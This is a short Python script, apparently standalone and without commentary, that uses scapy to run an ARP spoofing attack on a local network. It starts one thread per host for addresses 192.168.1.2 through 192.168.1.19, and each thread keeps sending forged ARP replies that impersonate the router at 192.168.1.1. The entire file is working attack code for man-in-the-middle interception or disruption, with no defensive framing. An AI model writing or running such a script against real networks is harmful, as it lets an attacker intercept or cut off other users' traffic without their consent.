#!/usr/bin/env python

from scapy.all import *
from time import sleep
from threading import Thread

conf.iface='eth0'

base = '192.168.1.'
router = base + '1'
targets = map(lambda x: base + str(x), range(2,20))

class Spoof(threading.Thread):
    def __init__(self, victim, gateway):
        self.packet = ARP()
        self.packet.psrc = gateway
        self.packet.pdst = victim
        threading.Thread.__init__(self)

    def run(self):
        print("Spoofing: {0}".format(self.packet.pdst))
        try:
            while True:
                send(self.packet, verbose=0)
                sleep(5)
        except:
            pass

for ip in targets:
    Spoof(ip, router).start()

